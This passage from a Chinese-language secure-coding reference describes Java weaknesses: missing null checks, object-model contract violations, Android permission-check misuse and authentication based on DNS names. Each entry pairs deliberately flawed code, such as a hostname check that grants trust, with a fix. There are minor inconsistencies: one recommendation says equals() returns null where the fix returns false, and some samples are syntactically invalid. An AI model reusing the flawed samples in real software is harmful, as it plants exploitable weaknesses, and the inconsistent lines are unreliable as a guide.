<p>[8] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.2</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[18] Standards Mapping - Web Application Security Consortium Version 2.00 Abuse of Functionality (WASC-42)</p>
<h4 id="Missing-Check-against-Null"><a href="#Missing-Check-against-Null" class="headerlink" title="Missing Check against Null"></a>Missing Check against Null</h4><h5 id="ABSTRACT-30"><a href="#ABSTRACT-30" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序会间接引用一个空指针，因为它不对有可能返回 Null 的函数返回值进行检查。</p>
<h5 id="EXPLANATION-30"><a href="#EXPLANATION-30" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>几乎每一个对软件系统的严重攻击都是从违反程序员的假设开始的。攻击后，程序员的假设看起来既脆弱又拙劣，但攻击前，许多程序员会在午休时间为自己的种种假设做很好的辩护。</p>
<p>在代码中很容易发现的两个可疑的假设是：一是这个函数调用不可能出错；二是即使出错了，也不会对系统造成什么重要影响。当程序员忽略函数返回值时，就暗示着自己是基于上述任一假设来执行操作。</p>
<p>例 1：以下代码在调用成员函数 compareTo() 之前，不会检查 getParameter() 返回的字符串是否为 null，因此可能会造成 null dereference。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String itemName = request.getParameter(ITEM_NAME);</span><br><span class="line"></span><br><span class="line">	if (itemName.compareTo(IMPORTANT_ITEM)) &#123;</span><br><span class="line"></span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>例 2：以下代码显示了这样一个例子，一个系统属性被设置为了 null，随后间接引用它的程序员错误地认为该属性值是已定义的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">System.clearProperty(&quot;os.name&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">String os = System.getProperty(&quot;os.name&quot;);</span><br><span class="line"></span><br><span class="line">if (os.equalsIgnoreCase(&quot;Windows 95&quot;) )</span><br><span class="line"></span><br><span class="line">	System.out.println(&quot;Not supported&quot;);</span><br></pre></td></tr></table></figure>
<p>对于这种编码错误的一贯辩解是：</p>
<p>“我知道请求值总是存在的，因为如果值不存在，程序就不能执行所需的操作，那么无论我处理这个错误，还是只是让程序自行崩溃而间接引用 Null 值，都没有关系。</p>
<p>但是，攻击者对于发现程序中的意外情况十分在行，特别是发生异常时。</p>
<h5 id="RECOMMENDATIONS-30"><a href="#RECOMMENDATIONS-30" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果函数返回错误代码或其他任何有关运行成功或失败的证据，请务必检查错误状况，即便没有任何明显迹象表明会发生这种错误。除了避免安全错误，许多乍看上去难以理解的 bug 最后都会归结为错误的方法调用，并带有 unchecked return value。</p>
<p>在您的应用程序中创建一种便于使用的、标准的处理故障方法。如果错误处理过程简单直接，往往不容易被程序员忽略。一种标准化的错误处理方法是，将围绕检查和处理错误状况的常用函数写入封装器，而无需程序员的其他干预。实施并采用封装器后，就可以禁止使用未封装的函数，并利用自定义规则加以执行。</p>
<p>例 3：以下代码对 getParameter() 执行了一个封装方法，用以检查 getParameter() 的返回值是否为 null，并且在所需参数没有定义时是否使用了默认值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">String safeGetParameter (HttpRequest request, String name)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    String value = request.getParameter(name);</span><br><span class="line"></span><br><span class="line">    if (value == null) &#123;</span><br><span class="line"></span><br><span class="line">        return getDefaultValue(name)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return value;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-28"><a href="#REFERENCES-28" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 253, CWE ID 690</p>
<p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[3] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II, APP6080 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II, APP6080 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II, APP6080 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II, APP6080 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II, APP6080 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II, APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II, APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[15] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[16] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Missing-Check-for-Null-Parameter"><a href="#Missing-Check-for-Null-Parameter" class="headerlink" title="Missing Check for Null Parameter"></a>Missing Check for Null Parameter</h4><h5 id="ABSTRACT-31"><a href="#ABSTRACT-31" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>函数必须检查其参数是否为 null，当前函数违反了这一规定。</p>
<h5 id="EXPLANATION-31"><a href="#EXPLANATION-31" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Java 标准指出，实现 Object.equals()、Comparable.compareTo() 和 Comparator.compare() 方法时，如果其参数为 null，则必须返回一个指定值。不遵守该规定可能会导致发生意外的行为。</p>
<p>例 1：以下代码实现了 equals() 方法，但没有检查参数是否为 null。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object object)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   return (toString().equals(object.toString()));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-31"><a href="#RECOMMENDATIONS-31" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请遵守以下规定：当方法 Object.equals() 接受一个 null 参数时，必须返回 null。</p>
<p>例 2：前面的示例已经过重写，以明确地检查是否存在 null 参数，如果存在则函数会返回 false。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object object)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    if (object == null)</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    return (toString().equals(object.toString()));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-29"><a href="#REFERENCES-29" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] MET10-J. Follow the general contract when implementing the compareTo() method CERT</p>
<p>[2] MET08-J. Preserve the equality contract when overriding the equals() method CERT</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<h4 id="Object-Model-Violation-Erroneous-clone-Method"><a href="#Object-Model-Violation-Erroneous-clone-Method" class="headerlink" title="Object Model Violation: Erroneous clone() Method"></a>Object Model Violation: Erroneous clone() Method</h4><h5 id="ABSTRACT-32"><a href="#ABSTRACT-32" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>方法 clone() 应调用 super.clone() 获取新的对象。</p>
<h5 id="EXPLANATION-32"><a href="#EXPLANATION-32" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在所有实现 clone() 的方法中，应通过调用 super.clone() 来获取新对象。如果类没有遵守该约定，那么子类的 clone() 方法将会返回一个错误的对象类型。</p>
<p>例 1：以下两个类显示了由于没有调用 super.clone() 而产生的 bug。由于 Kibitzer 实现 clone() 的方法的缘故，FancyKibitzer 的克隆方法将会返回类型为 Kibitzer 而非 FancyKibitzer 的对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public class Kibitzer implements Cloneable &#123;</span><br><span class="line"></span><br><span class="line">  public Object clone() throws CloneNotSupportedException &#123;</span><br><span class="line"></span><br><span class="line">    Object returnMe = new Kibitzer();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public class FancyKibitzer extends Kibitzer</span><br><span class="line"></span><br><span class="line">                           implements Cloneable &#123;</span><br><span class="line"></span><br><span class="line">  public Object clone() throws CloneNotSupportedException &#123;</span><br><span class="line"></span><br><span class="line">    Object returnMe = super.clone();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-32"><a href="#RECOMMENDATIONS-32" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>务必通过调用 super.clone() 来获取新对象。通过 java.lang.Object 实现 clone()，会总返回类型正确的对象。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public class Kibitzer implements Cloneable &#123;</span><br><span class="line"></span><br><span class="line">  public Object clone() throws CloneNotSupportedException &#123;</span><br><span class="line"></span><br><span class="line">    Object returnMe = super.clone();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public class FancyKibitzer extends Kibitzer</span><br><span class="line"></span><br><span class="line">                           implements Cloneable &#123;</span><br><span class="line"></span><br><span class="line">  public Object clone() throws CloneNotSupportedException &#123;</span><br><span class="line"></span><br><span class="line">    Object returnMe = super.clone();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-30"><a href="#REFERENCES-30" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 580</p>
<h4 id="Object-Model-Violation-Just-one-of-equals-and-hashCode-Defined"><a href="#Object-Model-Violation-Just-one-of-equals-and-hashCode-Defined" class="headerlink" title="Object Model Violation: Just one of equals() and hashCode() Defined"></a>Object Model Violation: Just one of equals() and hashCode() Defined</h4><h5 id="ABSTRACT-33"><a href="#ABSTRACT-33" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>这个类仅替代了 equals() 和 hashCode() 中的一个。</p>
<h5 id="EXPLANATION-33"><a href="#EXPLANATION-33" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Java 对象预期执行一系列与等式相关的不变式。其中的一个常量是相同的对象必须具有相同的哈希码。换句话说，如果 a.equals(b) == true，那么 a.hashCode() == b.hashCode()。</p>
<p>如果未能支持这一常量，当此类对象存储在一个集合中时，可能就会引发一些问题。如果将这个类的对象用作哈希表的关键值或是插入到一个 Map 或者 Set 中，那么相等的对象要具有相等的哈希码，这一点十分重要。</p>
<p>例 1：下面的类重写了 equals()，但没有重写 hashCode()。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class halfway() &#123;</span><br><span class="line"></span><br><span class="line">  public boolean equals(Object obj) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-33"><a href="#RECOMMENDATIONS-33" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>FindBugs 文档推荐了以下 hashCode() 的简单的“starter”实现方法 [1]。这个方法效率极低，但是会产生正确的结果。如果您不相信 hashCode() 对程序的重要性，请考虑使用这种实现方法。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class halfway() &#123;</span><br><span class="line"></span><br><span class="line">  public boolean equals(Object obj) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public int hashCode() &#123;</span><br><span class="line"></span><br><span class="line">    assert false : &quot;hashCode not designed&quot;;</span><br><span class="line"></span><br><span class="line">    return 42; // any arbitrary constant will do</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-31"><a href="#REFERENCES-31" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] D. H. Hovermeyer FindBugs User Manual</p>
<p>[2] MET09-J. Classes that define an equals() method must also define a hashCode() method CERT</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 581</p>
<h4 id="Object-Model-Violation-Just-one-of-restoreState-and-saveState-Defined"><a href="#Object-Model-Violation-Just-one-of-restoreState-and-saveState-Defined" class="headerlink" title="Object Model Violation: Just one of restoreState() and saveState() Defined"></a>Object Model Violation: Just one of restoreState() and saveState() Defined</h4><h5 id="ABSTRACT-34"><a href="#ABSTRACT-34" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>这个类仅替代了 saveState() 和 restoreState() 中的一个。</p>
<h5 id="EXPLANATION-34"><a href="#EXPLANATION-34" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>任何继承 StateHolder 接口的类都必须同时实施 saveState(javax.faces.context.FacesContext) 和 restoreState(javax.faces.context.FacesContext, java.lang.Object)，或者同时都不实施。由于这两种方法关系密切，因此，saveState(javax.faces.context.FacesContext) 和 restoreState(javax.faces.context.FacesContext, java.lang.Object) 方法不得驻留在继承层次结构的不同级别中。</p>
<p>以下类定义了 saveState()，但未定义 restoreState()，因此，无论扩展到何种类， 它始终会出错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class KibitzState implements StateHolder &#123;</span><br><span class="line"></span><br><span class="line">  public Object saveState(FacesContext fc) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-34"><a href="#RECOMMENDATIONS-34" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>同时实施此类中的 saveState(javax.faces.context.FacesContext) 和 restoreState(javax.faces.context.FacesContext, java.lang.Object)，或者同时都不实施。上述示例中的代码可以通过实施 restoreState() 解决。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class KibitzState implements StateHolder &#123;</span><br><span class="line"></span><br><span class="line">  public void saveState(FacesContext fc) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void restoreState(FacesContext fc, Object state) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-32"><a href="#REFERENCES-32" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems JavaDoc for StateHolder Interface</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<h4 id="Often-Misused-Android-Permission-Check"><a href="#Often-Misused-Android-Permission-Check" class="headerlink" title="Often Misused: Android Permission Check"></a>Often Misused: Android Permission Check</h4><h5 id="ABSTRACT-35"><a href="#ABSTRACT-35" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应慎重使用 checkCallingOrSelfPermission() 或 checkCallingOrSelfUriPermission() 函数，因为它允许没有所需或任何权限的调用程序利用您应用程序的权限来绕过权限检查。</p>
<h5 id="EXPLANATION-35"><a href="#EXPLANATION-35" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>函数 checkCallingOrSelfPermission() 或 checkCallingOrSelfUriPermission() 用来判定调用程序是否具备访问某个服务或给定 URI 所需的权限。但是，由于此类函数可允许缺乏相应权限的恶意应用程序利用您应用程序的权限进行访问，因而应慎重使用。</p>
<p>这意味着没有相应权限的恶意应用程序可以利用您应用程序的权限来避开它的权限检查，以获得对本应拒绝其访问的资源的访问。这可能导致所称的混淆代理人攻击。</p>
<h5 id="RECOMMENDATIONS-35"><a href="#RECOMMENDATIONS-35" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>因此，应尽可能使用 checkCallingPermission() 或 checkCallingUriPermission()。</p>
<h5 id="REFERENCES-33"><a href="#REFERENCES-33" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Designing for Security Android</p>
<p>[2] Context: Android Developers Android</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 275</p>
<p>[4] Standards Mapping - FIPS200 AC</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A2 Broken Access Control</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.2</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[17] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 863</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[28] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authorization</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Often-Misused-Authentication"><a href="#Often-Misused-Authentication" class="headerlink" title="Often Misused: Authentication"></a>Often Misused: Authentication</h4><h5 id="ABSTRACT-36"><a href="#ABSTRACT-36" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>攻击者可以欺骗 DNS 条目。勿将 DNS 名称作为安全性的依据。</p>
<h5 id="EXPLANATION-36"><a href="#EXPLANATION-36" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>许多 DNS 服务器都很容易被攻击者欺骗，所以应考虑到某天软件有可能会在有问题的 DNS 服务器环境下运行。如果允许攻击者进行 DNS 更新（有时称为 DNS 缓存中毒），则他们会通过自己的机器路由您的网络流量，或者让他们的 IP 地址看上去就在您的域中。勿将系统安全寄托在 DNS 名称上。</p>
<p>示例：以下代码使用 DNS 查找，以确定输入请求是否来自可信赖的主机。如果攻击者可以攻击 DNS 缓存，那么他们就会获得信任。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String ip = request.getRemoteAddr();</span><br><span class="line"></span><br><span class="line">InetAddress addr = InetAddress.getByName(ip);</span><br><span class="line"></span><br><span class="line">if (addr.getCanonicalHostName().endsWith(&quot;trustme.com&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">trusted = true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>IP 地址相比 DNS 名称而言更为可靠，但也还是可以被欺骗的。攻击者可以轻易修改要发送的数据包的源 IP 地址，但是响应数据包会返回到修改后的 IP 地址。为了看到响应的数据包，攻击者需要在受害者机器与修改的 IP 地址之间截取网络数据流。为实现这个目的，攻击者通常会尝试把自己的机器和受害者的机器部署在同一子网内。攻击者可能会巧妙地采取源地址路由的方法来回避这一要求，但是在今天的互联网上通常会禁止源地址路由。总而言之，核实 IP 地址是一种有用的 authentication 方式，但不应仅使用这一种方法进行 authentication。</p>
<h5 id="RECOMMENDATIONS-36"><a href="#RECOMMENDATIONS-36" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果通过域名检查的方式可以确保主机接受和发送的 DNS 记录的一致性，您可以更加信任这一方式。攻击者如若不能控制目标域的域名服务器，就无法同时欺骗接受和发送的 DNS 记录。虽然这种方法并不简单，但是：攻击者也许可以说服域注册者把域移交给一个恶意的域名服务器。依赖于 DNS 记录的 authentication 是有风险的。</p>
<p>虽然没有十分简单的 authentication 机制，但是还有比基于主机的 authentication 更好的方法。密码系统提供了比较不错的安全性，但是这种安全性却易受密码选择不当、不安全的密码传送和 password management 失误的影响。类似于 SSL 的方法值得考虑，但是通常这样的方法过于复杂，以至于使用时会有运行出错的风险，而关键资源也随时面临着被窃取的危险。在大多数情况下，包括一个物理标记的多重 authentication 可以在合理的代价范围内提供最大程度的安全保障。</p>
<h5 id="REFERENCES-34"><a href="#REFERENCES-34" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 247, CWE ID 292, CWE ID 558, CWE ID 807</p>
<p>[2] Standards Mapping - FIPS200 IA</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-23 Session Authenticity (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A3 Broken Authentication and Session Management</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A7 Broken Authentication and Session Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A3 Broken Authentication and Session Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A2 Broken Authentication and Session Management</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.3</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.7</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.10</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.10</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.10</p>
<p>[15] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 807</p>
<p>[16] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 807</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3460 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3460 CAT I</p>
